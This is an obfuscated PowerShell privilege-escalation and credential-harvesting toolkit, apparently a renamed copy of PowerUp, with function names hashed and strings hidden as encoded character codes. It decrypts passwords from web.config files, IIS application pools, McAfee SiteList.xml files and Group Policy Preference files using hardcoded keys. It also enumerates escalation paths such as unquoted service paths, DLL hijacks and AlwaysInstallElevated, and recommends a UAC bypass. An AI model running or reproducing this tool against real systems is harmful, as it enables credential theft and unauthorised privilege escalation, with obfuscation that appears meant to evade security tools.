                    $unfik = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter pfc83754b32c3 971151121101011169511410110310510511546101120101  | Sort-Object -Descending | Select-Object fullname -First 1

                     
                    if (Test-Path  ($unfik.FullName)) {

                         
                        $rghcz = (Get-Item $Env:temp).FullName + "\web.config"

                         
                        if (Test-Path  ($rghcz)) {
                            Remove-Item $rghcz
                        }

                         
                        Copy-Item $fxhrz $rghcz

                         
                        $ggczp = $unfik.fullname+pfc83754b32c3 3245112100102323499111110110101991161051111108311611410511010311534324010310111645105116101109323669110118581161011091124146701171081087897109101
                        $Null = Invoke-Expression $ggczp

                         
                        [xml]$jbear = Get-Content $rghcz

                         
                        if ($jbear.configuration.connectionStrings.add) {

                             
                            $jbear.configuration.connectionStrings.add | ForEach-Object {

                                [String]$qveet = $_.connectionString
                                if($qveet -like "*password*") {
                                    $rqtir = $qveet.Split("=")[3].Split(";")[0]
                                    $fvjub = $qveet.Split("=")[4].Split(";")[0]
                                    $aknya = $qveet.Split("=")[1].Split(";")[0]
                                    $ezedx = $zabhq
                                    $zvmuw = $fxhrz
                                    $kxhaf = pfc83754b32c3 89101115
                                    $Null = $dqvfc.Rows.Add($rqtir, $fvjub, $aknya,$ezedx,$fxhrz, $kxhaf)
                                }
                            }

                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose pfc83754b32c3 9711511211010111695114101103105105115461011201013210011110111532110111116321011201051151163210511032116104101321001011029711710811632108111999711610511111046
                        $False
                    }
                }
            }
        }

         
        if( $dqvfc.rows.Count -gt 0 ) {
             
            $dqvfc |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose pfc83754b32c3 78111329911111011010199116105111110321151161141051101031153210211111711010046
            $False
        }
    }
    else {
        Write-Verbose pfc83754b32c3 6511211299109100461011201013210011110111532110111116321011201051151163210511032116104101321001011029711710811632108111999711610511111046
        $False
    }

    $ErrorActionPreference = $wtpwy
}


function p985f9d6f8e45 {
  

    $wtpwy = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

     
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
         
        $dqvfc = New-Object System.Data.DataTable

         
        $Null = $dqvfc.Columns.Add("user")
        $Null = $dqvfc.Columns.Add("pass")
        $Null = $dqvfc.Columns.Add("type")
        $Null = $dqvfc.Columns.Add("vdir")
        $Null = $dqvfc.Columns.Add("apppool")

         
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

             
            $ihtct = $_

             
            $stiss = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $srigz = Invoke-Expression $stiss

             
            $feess = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $mivqy = Invoke-Expression $feess

             
            if (($mivqy -ne "") -and ($mivqy -isnot [system.array])) {
                 
                $Null = $dqvfc.Rows.Add($srigz, $mivqy,pfc83754b32c3 6511211210810599971161051111103280111111108,pfc83754b32c3 7865,$ihtct)
            }
        }

         
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

             
            $vrgvv = $_

             
            $ueejh = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $pugyz = Invoke-Expression $ueejh

             
            $saspn = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $hiaxx = Invoke-Expression $saspn

             
            if (($hiaxx -ne "") -and ($hiaxx -isnot [system.array])) {
                 
                $Null = $dqvfc.Rows.Add($pugyz, $hiaxx,pfc83754b32c3 8610511411611797108326810511410199116111114121,$vrgvv,pfc83754b32c3 7865)
            }
        }

         
        if( $dqvfc.rows.Count -gt 0 ) {
             
            $dqvfc |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
             
            Write-Verbose pfc83754b32c3 78111329711211210810599971161051111103211211111110832111114321181051141161179710832100105114101991161111141213211297115115119111114100115321191011141013210211111711010046
            $False
        }
    }
    else {
        Write-Verbose pfc83754b32c3 6511211299109100461011201013210011110111532110111116321011201051151163210511032116104101321001011029711710811632108111999711610511111046
        $False
    }

    $ErrorActionPreference = $wtpwy
}


function p4cc8870890b1 {
 

    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $nayqn
    )

    BEGIN {
        function pba7909afd090 {
             
             
             
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $jrgdn
            )

             
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

             
            $ydypt = [System.Text.Encoding]::ASCII
            $sbukh = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $bdvda = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

             
            $ikvks = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

             
            $ixtus = 0;
            $eqcws = [System.Convert]::FromBase64String($jrgdn) | Foreach-Object { $_ -BXor $ikvks[$ixtus++ % $ikvks.Length] }

             
            $teuwt = $sbukh.ComputeHash($ydypt.GetBytes(pfc83754b32c3 6033643536379462)) + ,0x00*4

             
            $bdvda.Mode = pfc83754b32c3 696766
            $bdvda.Padding = pfc83754b32c3 78111110101
            $bdvda.Key = $teuwt

             
            $nfxkb = $bdvda.CreateDecryptor().TransformFinalBlock($eqcws, 0, $eqcws.Length)

             
            $paewa = [Array]::IndexOf($nfxkb, [Byte]0)
            if($paewa -ne -1) {
                $hsmuz = $ydypt.GetString($nfxkb[0..($paewa-1)])
            }
            else {
                $hsmuz = $ydypt.GetString($nfxkb)
            }

            New-Object -TypeName PSObject -Property @{pfc83754b32c3 6911099114121112116101100=$jrgdn;pfc83754b32c3 6810199114121112116101100=$hsmuz}
        }

        function pf8d4c8b81461 {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [String]
                $nayqn
            )

            try {
                [Xml]$bbmtc = Get-Content -Path $nayqn

                if($bbmtc.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $bbmtc.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $qnbuf = $_.Password.pfc83754b32c3 3584101120116

                            if($_.Password.Encrypted -eq 1) {
                                 
                                $fygwc = if($qnbuf) { (Get-DecryptedSitelistPassword -B64Pass $qnbuf).Decrypted } else {''}
                            }
                            else {
                                $fygwc = $qnbuf
                            }

                            $mdvyx = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $nayqn = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $mqmnj = @{
                                pfc83754b32c3 7897109101 = $_.Name;
                                pfc83754b32c3 691109798108101100 = $_.Enabled;
                                pfc83754b32c3 83101114118101114 = $mdvyx;
                                pfc83754b32c3 8097116104 = $nayqn;
                                pfc83754b32c3 68111109971051107897109101 = $_.DomainName;
                                pfc83754b32c3 851151011147897109101 = $_.UserName;
                                pfc83754b32c3 69110998097115115119111114100 = $qnbuf;
                                pfc83754b32c3 68101998097115115119111114100 = $fygwc;
                            }
                            New-Object -TypeName PSObject -Property $mqmnj
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if($gmfih[pfc83754b32c3 8097116104]) {
            $fbzgr = $nayqn
        }
        else {
            $fbzgr = @(pfc83754b32c3 6758928011411110311497109327010510810111592,pfc83754b32c3 67589280114111103114971093270105108101115324012056544192,pfc83754b32c3 67589268111991171091011101161153297110100328310111611610511010311592,pfc83754b32c3 6758928511510111411592)
        }

        $fbzgr | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include pfc83754b32c3 831051161017610511511646120109108 -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistFields -Path $_.Fullname
        }
    }
}


function pfdcd2f35f590 {
 
    
    [CmdletBinding()]
    Param()
    
     
    Set-StrictMode -Version 2

     
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core
    
     
    function pe9f99d097b3f {
        [CmdletBinding()]
        Param (
            [string] $bpmqh 
        )

        try {
             
            $bwycy = ($bpmqh.length % 4)
            
            switch ($bwycy) {
                pfc83754b32c3 49 {$bpmqh = $bpmqh.Substring(0,$bpmqh.Length -1)}
                pfc83754b32c3 50 {$bpmqh += (pfc83754b32c3 61 * (4 - $bwycy))}
                pfc83754b32c3 51 {$bpmqh += (pfc83754b32c3 61 * (4 - $bwycy))}
            }

            $fieiz = [Convert]::FromBase64String($bpmqh)
            
             
            $xhfpt = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $symia = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
             
            $vbdcv = New-Object Byte[]($xhfpt.IV.Length) 
            $xhfpt.IV = $vbdcv
            $xhfpt.Key = $symia
            $uvctt = $xhfpt.CreateDecryptor() 
            [Byte[]] $ryyju = $uvctt.TransformFinalBlock($fieiz, 0, $fieiz.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($ryyju)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
     
    function p884ab54d5faf {
        [CmdletBinding()]
        Param (
            $kajkf 
        )
    
        try {
            
            $vuqwn = Split-Path $kajkf -Leaf
            [XML] $bhvzu = Get-Content ($kajkf)

            $bpmqh = @()
            $sevhs = @()
            $rxesr = @()
            $fcanu = @()
            $cqmrp = @()
    
             
            if ($bhvzu.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($vuqwn) {
                    pfc83754b32c3 7111411111711211546120109108 {
                        $bpmqh += , $bhvzu | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $rxesr += , $bhvzu | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    pfc83754b32c3 831011141181059910111546120109108 {  
                        $bpmqh += , $bhvzu | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    pfc83754b32c3 83991041011001171081011001169711510711546120109108 {
                        $bpmqh += , $bhvzu | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    pfc83754b32c3 689711697831111171149910111546120109108 { 
                        $bpmqh += , $bhvzu | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    pfc83754b32c3 8011410511011610111411546120109108 { 
                        $bpmqh += , $bhvzu | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    pfc83754b32c3 6811410511810111546120109108 { 
                        $bpmqh += , $bhvzu | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $sevhs += , $bhvzu | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $fcanu += , $bhvzu | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($petzb in $bpmqh) {
               Write-Verbose "Decrypting $Pass"
               $tqdve = Get-DecryptedCpassword $petzb
               Write-Verbose "Decrypted a password of $DecryptedPassword"
                
               $cqmrp += , $tqdve
           }
            
             
            if (-not $cqmrp) {$cqmrp = pfc83754b32c3 91667665787593}
            if (-not $sevhs) {$sevhs = pfc83754b32c3 91667665787593}
            if (-not $fcanu)  {$fcanu = pfc83754b32c3 91667665787593}
            if (-not $rxesr)  {$rxesr = pfc83754b32c3 91667665787593}
                  
             
            $mqmnj = @{pfc83754b32c3 8097115115119111114100115 = $cqmrp;
                                  pfc83754b32c3 851151011147897109101115 = $sevhs;
                                  pfc83754b32c3 6710497110103101100 = $fcanu;
                                  pfc83754b32c3 781011197897109101 = $rxesr;
                                  pfc83754b32c3 70105108101 = $kajkf}
                
            $mcykm = New-Object -TypeName PSObject -Property $mqmnj
            Write-Verbose "The password is between {} and may be more than one value."
            if ($mcykm) {Return $mcykm} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        $yivri = $Env:ALLUSERSPROFILE

        if($yivri -notmatch pfc83754b32c3 8011411110311497109689711697) {
            $yivri = "$AllUsers\Application Data"
        }

         
        $cvpak = Get-ChildItem -Path $yivri -Recurse -Include pfc83754b32c3 7111411111711211546120109108,pfc83754b32c3 831011141181059910111546120109108,pfc83754b32c3 83991041011001171081011001169711510711546120109108,pfc83754b32c3 689711697831111171149910111546120109108,pfc83754b32c3 8011410511011610111411546120109108,pfc83754b32c3 6811410511810111546120109108 -Force -ErrorAction SilentlyContinue
    
        if ( -not $cvpak ) {
            Write-Verbose pfc83754b32c3 781113211211410110210111410111099101321021051081011153210211111711010046
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($kajkf in $cvpak) {
                Get-GppInnerFields $kajkf.Fullname
            }
        }
    }

    catch {Write-Error $Error[0]}
}


function pf002460e51c9 {
 

    $nayqn = pfc83754b32c3 851151011146510010046109115105

    $ejsck = ""

    try {
        [System.Convert]::FromBase64String( $ejsck ) | Set-Content -Path $nayqn -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 791171161121171168097116104 $nayqn
        $yebis
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 791171161121171168097116104 $_
        $yebis
    }
}


function p0691b5f201f2 {
 

    [CmdletBinding()]
    Param(
        [Switch]
        $wcmfx
    )

    if($wcmfx) {
        $uaskb = "$($Env:ComputerName).$($Env:UserName).html"

        $kguhk = "<style>"
        $kguhk = $kguhk + "BODY{background-color:peachpuff;}"
        $kguhk = $kguhk + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $kguhk = $kguhk + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $kguhk = $kguhk + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $kguhk = $kguhk + "</style>"

        ConvertTo-HTML -Head $kguhk -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $uaskb
    }

     

    "`n[*] Running Invoke-AllChecks"

    $eipuk = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($eipuk){
        "[+] Current user already has local administrative privileges!"

        if($wcmfx) {
            ConvertTo-HTML -Head $kguhk -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $uaskb
        }
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."

        $jbeyi = p102c2cf39786 | Select-Object -ExpandProperty SID
        if($jbeyi -contains pfc83754b32c3 834549455345515045535252) {
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($wcmfx) {
                ConvertTo-HTML -Head $kguhk -Body "<H2> User In Local Group With Administrative Privileges</H2>" | Out-File -Append $uaskb
            }
        }
    }


     

    "`n`n[*] Checking for unquoted service paths..."
    $sevhr = pe388e731bd15
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $sevhr = p2159fc8769db
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Service File Permissions</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking service permissions..."
    $sevhr = p9b61242fcf5a
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Modifiable Services</H2>" | Out-File -Append $uaskb
    }


     

    "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
    $sevhr = p25b71836e55a
    $sevhr | Where-Object {$_} | Foreach-Object {
        $qdwdx = "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'"
        $_ | Add-Member Noteproperty pfc83754b32c3 65981171151017011711099116105111110 $qdwdx
        $_
    } | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $uaskb
    }


     

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (p2d03135f6dbe) {
        $yebis = New-Object PSObject
        $yebis | Add-Member Noteproperty pfc83754b32c3 65981171151017011711099116105111110 "Write-UserAddMSI"
        $sevhr = $yebis

        $sevhr | Format-List
        if($wcmfx) {
            $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $uaskb
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $sevhr = pf07416a57a01
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Registry Autologons</H2>" | Out-File -Append $uaskb
    }


    "`n`n[*] Checking for modifidable registry autoruns and configs..."
    $sevhr = pe216079b68bd
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $uaskb
    }

     

    "`n`n[*] Checking for modifiable schtask files/configs..."
    $sevhr = pe616f0e08f19
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Modifidable Schask Files</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking for unattended install files..."
    $sevhr = p0d7e58e5f500
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $sevhr = pd9f08a01e613 | Where-Object {$_}
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $sevhr = p985f9d6f8e45 | Where-Object {$_}
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $uaskb
    }

    "`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files...."
    $sevhr = p4cc8870890b1 | Where-Object {$_}
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>McAfee's SiteList.xml's</H2>" | Out-File -Append $uaskb
    }
    "`n"

    "`n`n[*] Checking for cached Group Policy Preferences .xml files...."
    $sevhr = pfdcd2f35f590 | Where-Object {$_}
    $sevhr | Format-List
    if($wcmfx) {
        $sevhr | ConvertTo-HTML -Head $kguhk -Body "<H2>Cached GPP Files</H2>" | Out-File -Append $uaskb
    }
    "`n"

    if($wcmfx) {
        "[*] Report written to '$HtmlReportFile' `n"
    }
}


 
$guecr = pa9d363655e58 -ModuleName PowerUpModule

$rtgse = @(
    (pe9312f79d891 kernel32 GetCurrentProcess ([IntPtr]) @())
    (pe9312f79d891 advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (pe9312f79d891 advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (pe9312f79d891 advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (pe9312f79d891 advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (pe9312f79d891 advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (pe9312f79d891 advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)

 
$sqkfh = pcedba39f259e $guecr PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig =           pfc83754b32c3 481204848484848484849
    ChangeConfig =          pfc83754b32c3 481204848484848484850
    QueryStatus =           pfc83754b32c3 481204848484848484852
    EnumerateDependents =   pfc83754b32c3 481204848484848484856
    Start =                 pfc83754b32c3 481204848484848484948
    Stop =                  pfc83754b32c3 481204848484848485048
    PauseContinue =         pfc83754b32c3 481204848484848485248
    Interrogate =           pfc83754b32c3 481204848484848485648
    UserDefinedControl =    pfc83754b32c3 481204848484848494848
    Delete =                pfc83754b32c3 481204848484948484848
    ReadControl =           pfc83754b32c3 481204848485048484848
    WriteDac =              pfc83754b32c3 481204848485248484848
    WriteOwner =            pfc83754b32c3 481204848485648484848
    Synchronize =           pfc83754b32c3 481204848494848484848
    AccessSystemSecurity =  pfc83754b32c3 481204849484848484848
    GenericAll =            pfc83754b32c3 481204948484848484848
    GenericExecute =        pfc83754b32c3 481205048484848484848
    GenericWrite =          pfc83754b32c3 481205248484848484848
    GenericRead =           pfc83754b32c3 481205648484848484848
    AllAccess =             pfc83754b32c3 481204848487048497070
} -Bitfield

$cmdsp = pcedba39f259e $guecr PowerUp.SidAttributes UInt32 @{
    SE_GROUP_ENABLED =              pfc83754b32c3 481204848484848484852
    SE_GROUP_ENABLED_BY_DEFAULT =   pfc83754b32c3 481204848484848484850
    SE_GROUP_INTEGRITY =            pfc83754b32c3 481204848484848485048
    SE_GROUP_INTEGRITY_ENABLED =    pfc83754b32c3 481206748484848484848
    SE_GROUP_MANDATORY =            pfc83754b32c3 481204848484848484849
    SE_GROUP_OWNER =                pfc83754b32c3 481204848484848484856
    SE_GROUP_RESOURCE =             pfc83754b32c3 481205048484848484848
    SE_GROUP_USE_FOR_DENY_ONLY =    pfc83754b32c3 481204848484848484948
} -Bitfield

$fbhki = pc30e7efd056f $guecr PowerUp.SidAndAttributes @{
    Sid         =   pc5ee9b0b0b3b 0 IntPtr
    Attributes  =   pc5ee9b0b0b3b 1 UInt32
}

$wbhbk = pc30e7efd056f $guecr PowerUp.TokenGroups @{
    GroupCount  = pc5ee9b0b0b3b 0 UInt32
    Groups      = pc5ee9b0b0b3b 1 $fbhki.MakeArrayType() -MarshalAs @(pfc83754b32c3 6612186971086511411497121, 32)
}

$awxur = $rtgse | pa66229ef02e5 -Module $guecr -Namespace pfc83754b32c3 801111191011148511246789711610511810177101116104111100115
$qcpug = $awxur[pfc83754b32c3 97100118971121055150]
$hcpdk = $awxur[pfc83754b32c3 1071011141101011085150]
